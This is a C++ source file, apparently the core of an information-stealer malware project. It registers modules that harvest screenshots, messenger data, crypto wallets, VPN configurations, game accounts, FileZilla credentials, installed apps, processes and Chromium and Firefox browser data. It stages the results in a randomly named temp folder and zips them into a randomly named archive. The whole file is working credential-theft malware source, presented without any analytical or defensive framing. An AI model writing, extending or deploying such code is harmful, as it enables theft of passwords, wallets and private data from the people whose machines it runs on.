//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "miniz.h"
#include "impl/Screenshot.h"
#include "impl/Info.h"
#include "impl/messengers/Socials.h"
#include "impl/files/Files.h"
#include "impl/Processes.h"
#include "impl/crypto/Crypto.h"
#include "impl/vpns/VPNs.h"
#include "impl/games/Games.h"
#include "impl/InstalledApps.h"
#include "impl/FileZilla.h"
#include "impl/browsers/chromium/ChromiumBrowsers.h"
#include "impl/browsers/firefox/FirefoxBrowsers.h"

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Socials());
    this->modules.push_back(new Crypto());
    this->modules.push_back(new VPNs());
    this->modules.push_back(new Games());
    this->modules.push_back(new Files());
    this->modules.push_back(new Info());
    this->modules.push_back(new Processes());
    this->modules.push_back(new InstalledApps());
    this->modules.push_back(new FileZilla());
    this->modules.push_back(new ChromiumBrowsers());
    this->modules.push_back(new FirefoxBrowsers());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    StealerModuleGroup::execute(this->root_dir);
}

void Stealer::complete() {
    fs::path log = this->zip_log();
    fs::remove(this->root_dir);
}

void add_file_to_zip(mz_zip_archive& zip_archive, const fs::path& file_path, const fs::path& base_path) {
    std::string file_in_zip = fs::relative(file_path, base_path).string();
    mz_zip_writer_add_file(&zip_archive, file_in_zip.c_str(), file_path.string().c_str(), nullptr, 0, MZ_DEFAULT_COMPRESSION);
}

void add_folder_to_zip(mz_zip_archive& zip_archive, const fs::path& folder_path, const fs::path& base_path) {
    for (const auto& entry : fs::recursive_directory_iterator(folder_path)) {
        if (fs::is_regular_file(entry.path())) {
            add_file_to_zip(zip_archive, entry.path(), base_path);
        }
    }
}

fs::path Stealer::zip_log() {
    fs::path out_zip = Utils::getTemp() / Utils::generateString(20);
    std::ofstream f(out_zip);
    f.close();

    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));
    if (!mz_zip_writer_init_file(&zip_archive, out_zip.string().c_str(), 0)) {
        return "";
    }

    add_folder_to_zip(zip_archive, this->root_dir, this->root_dir);

    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
        mz_zip_writer_end(&zip_archive);
        return "";
    }

    mz_zip_writer_end(&zip_archive);
    return out_zip;
}
